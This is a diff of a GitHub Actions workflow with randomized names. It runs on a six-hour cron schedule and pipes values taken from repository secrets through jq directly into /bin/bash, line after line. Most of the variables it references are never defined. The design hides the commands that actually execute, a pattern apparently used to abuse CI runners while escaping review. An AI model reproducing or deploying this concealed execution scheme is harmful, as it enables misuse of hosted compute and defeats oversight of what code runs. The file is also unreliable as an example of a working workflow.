@@ -1,8 +1,9 @@
 name: cavepreviously
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '32 5/6 * * *'
+    - cron: '53 1/6 * * *'
 
 jobs:
   build:
@@ -12,18 +13,13 @@ jobs:
       - uses: actions/checkout@v4
       - name: cavepreviously
         env:
-          wo95936: ${{ secrets.wo95936 }}
+          pfmbm670: ${{ secrets.pfmbm670 }}
         run: |
-          echo $wo95936 | jq -r .j7 | /bin/bash
-          echo $cyxyy132 | jq -r .lfflg165 | /bin/bash
-          echo $kzbgu7 | jq -r .ioz049 | /bin/bash
-          echo $seytm37318 | jq -r .du1 | /bin/bash
-          echo $blclr034 | jq -r .l997 | /bin/bash
-          echo $iz71 | jq -r .llwg44 | /bin/bash
-          echo $vcduh8 | jq -r .puoto8589 | /bin/bash
-          echo $mbk77583 | jq -r .pepf3500 | /bin/bash
-          echo $xvcp34935 | jq -r .iv4177 | /bin/bash
-          echo $hwoal38888 | jq -r .rgmh5371 | /bin/bash
-          echo $f960 | jq -r .zlcn6 | /bin/bash
-          echo $cevuq4418 | jq -r .vwojj765 | /bin/bash
+          echo $pfmbm670 | jq -r .kfcc44078 | /bin/bash
+          echo $m80 | jq -r .otn548 | /bin/bash
+          echo $dmf582 | jq -r .fkmja8 | /bin/bash
+          echo $acbj2708 | jq -r .cch88 | /bin/bash
+          echo $uqxqf07 | jq -r .en1462 | /bin/bash
+          echo $onoz1 | jq -r .ngfg5 | /bin/bash
+          echo $xwupw014 | jq -r .rqc52928 | /bin/bash
 
